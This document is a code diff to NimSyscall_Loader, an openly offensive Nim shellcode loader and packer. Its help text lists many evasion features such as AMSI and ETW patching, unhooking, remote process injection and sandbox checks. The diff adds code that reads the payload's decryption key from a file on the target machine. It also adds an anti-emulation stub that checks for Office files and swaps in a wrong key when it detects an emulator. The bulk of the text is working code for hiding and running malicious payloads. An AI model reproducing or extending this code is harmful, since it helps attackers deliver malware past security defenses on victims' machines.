@@ -67,7 +67,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.1
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -79,6 +79,7 @@ Options:
   --version     Show version.
   --file filename  File to encrypt.
   --key key     Key to encrypt with
+    --keyfile keyfile  File to read key from
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
@@ -222,6 +223,9 @@ var
     packerPath = os.getAppDir()
     outfile: string = packerPath
     envkey: string = rndStr(rand(10..35))
+    usekeyFile: bool = false
+    dnsKey: bool = false
+    webKey: bool = false
     dll_out: bool = false
     dllfunc: string = ""
     dllexportfunctions: seq[string]
@@ -247,6 +251,8 @@ var
     parentProcess: string = ""
     spoofArgs: string = ""
     shellcodeFile: seq[string] = @["enc.blob"]
+    keyFile: seq[string] = @["key.txt"]
+    kfile: string = ""
     stegofile: string = ""
     useStego: bool = false
     stFile: string = ""
@@ -442,6 +448,13 @@ if args["--shellcodeFile"]:
     let shellcodeFilestring = args["--shellcodeFile"]
     scfile = fmt"{shellcodeFilestring}"
     shellcodeFile = scfile.split(',')
+
+if args["--keyfile"]:
+    usekeyFile = true
+    let keyFilestring = args["--keyfile"]
+    kfile = fmt"{keyFilestring}"
+    keyFile = kfile.split(',')
+
 
 if args["--shellcodeURL"]:
     retrieveFromURL = true
@@ -854,6 +867,21 @@ var lastFour = envkey[^4..^1]
 # And save a key without those last 4 characters in a new one
 var firstwithoutlast4 = envkey.replace(lastFour, "")
 #echo "First without last 4 :" & firstwithoutlast4
+
+
+# if SkipDefaultSandBoxChecks is set, put firstwithoutlast4 into the keyFile and write it to disk. Otherwise write envkey into it
+if(usekeyFile):
+    if (defaultSandBoxChecks):
+        if (antidebug):
+            for i in keyFile:
+                writeFile(i, envkey)
+        else:
+            for i in keyFile:
+                writeFile(i, firstwithoutlast4)
+    else:
+        for i in keyFile:
+            writeFile(i, envkey)
+
 
 if (peload and embeddedArguments):
     verbose = true # workaround, something in DInvoke+NoVerbose breaks the arguments
@@ -1482,6 +1510,7 @@ let ShellcodeFromFileStub * = fmt"""
     var dectext = newSeq[byte](len(enctext))
 
 """
+
 
 let ServiceDllStub * = """
 
@@ -2136,16 +2165,46 @@ when defined(JmpEntry):
     var jmpMod: string = obf("{jmpEntryDLL}")
     var jmpFunc: string = obf("{jmpEntryFunction}")
 
-when defined(SkipDefaultSandBoxChecks):
-    when defined(AntiDebug):
+when defined(noKey):
+    when defined(keyFromFile):
+        # read key from file (keyFile)
+        var keyFileHandle: File
+        var keyString: string
+        for f in {keyFile}:
+            try:
+                keyFileHandle = open(f, fmRead)
+                keyString = keyFileHandle.readAll()
+                when defined(verbose):
+                    echo obf("[*] Key file found: ") & f
+                break
+            except:
+                when defined(verbose):
+                    echo obf("[-] Failed to open file: ") & f
+        if keyString.len == 0:
+            when defined(verbose):
+                echo obf("[-] Key file is empty or not found!")
+            quit(1)
+        when defined(verbose):
+            echo obf("[*] Key: ") & keyString
+        var envkey = keyString
+        var envkey2 = envkey
+    when defined(dnsKey):
+        # Todo: Implement DNS Key
+        echo ""
+    when defined(webKey):
+        # Todo: Implement Web Key
+        echo ""
+else:
+    when defined(SkipDefaultSandBoxChecks):
+        when defined(AntiDebug):
+            var envkey = obf("{firstwithoutlast4}")
+            var envkey2 = envkey
+        else:
+            var envkey = obf("{envkey}")
+            var envkey2 = obf("{envkey}")
+    else:
         var envkey = obf("{firstwithoutlast4}")
         var envkey2 = envkey
-    else:
-        var envkey = obf("{envkey}")
-        var envkey2 = obf("{envkey}")
-else:
-    var envkey = obf("{firstwithoutlast4}")
-    var envkey2 = envkey
 var ptrEncText: ptr byte
 var ptrDecText: ptr byte
 
@@ -2270,6 +2329,53 @@ proc accelerated_sleep*(): void =
         when defined(verbose):
             echo obf("[*] Final Key: ") & envkey2
 accelerated_sleep()
+"""
+
+let AntiEmulateStub * = """
+
+#from os import fileExists
+
+proc GetFileAttributesA(path: string): DWORD {.importc, dynlib: "kernel32.dll".}
+
+proc officeFileCheck(): void =
+    # check if the file "C:\Program Files\Microsoft Office\AppXManifest.xml" exists
+    var fileCount: int = 0
+    var AppXManifest: string = obf(r"C:\Program Files\Microsoft Office\AppXManifest.xml")
+    var dwAttributes: DWORD
+    dwAttributes = GetFileAttributesA(cast[LPCSTR](AppXManifest))
+    if (dwAttributes != INVALID_FILE_ATTRIBUTES) and ((dwAttributes and FILE_ATTRIBUTE_DIRECTORY) == 0):
+        fileCount += 1
+        when defined(verbose):
+            echo obf("[*] File: ") & AppXManifest & obf(" exists")
+    elif(dwAttributes == 0xFFFFFFFFFFFFFFFF):
+        when defined(verbose):
+            echo obf("[*] File: ") & AppXManifest & obf(" does not exist")
+    else:
+        # check if file "C:\Program Files\Microsoft Office\RappelZapp.xml" exists
+        var RappelZapp: string = obf(r"C:\Program Files\Microsoft Office\RappelZapp.xml")
+        dwAttributes = GetFileAttributesA(cast[LPCSTR](RappelZapp))
+        if dwAttributes != INVALID_FILE_ATTRIBUTES:
+            fileCount += 1
+            when defined(verbose):
+                echo obf("[*] File: ") & RappelZapp & obf(" exists")
+        elif(dwAttributes == 0xFFFFFFFFFFFFFFFF):
+            when defined(verbose):
+                echo obf("[*] File: ") & RappelZapp & obf(" does not exist")
+        
+    if fileCount == 2:
+        when defined(verbose):
+            echo obf("[*] Two many files found...")
+        envkey = obf("aetschibaetsch")
+        envkey2 = envkey
+        when defined(verbose):
+            echo obf("[*] Final Key: ") & envkey2
+    else:
+        when defined(verbose):
+            echo obf("[*] No false answer to files being checked, continuing...")
+
+officeFileCheck()
+
+
 """
 
 let AmsiNtCreateSectionDecryptStub = fmt"""
@@ -2973,6 +3079,7 @@ if (apihide):
 
 if(defaultSandBoxChecks):
     stub.add(Accelerated_sleepStub)
+    stub.add(AntiEmulateStub)
 
 if(gosleep or remoteETWpatch or remoteAMSIpatch):
     stub.add(SleepStubFirst)
@@ -3379,6 +3486,10 @@ elif (retrieveFromURL):
     stub.add(ShellcodefromURLStub)
 else:
     basicCompileFlags.add("-d:PayloadEmbedded ")
+
+if(usekeyFile or dnsKey or webKey):
+    basicCompileFlags.add("-d:noKey ")
+    basicCompileFlags.add("-d:keyFromFile ")
 
 if(stomb):
     basicCompileFlags.add("-d:stomb ")
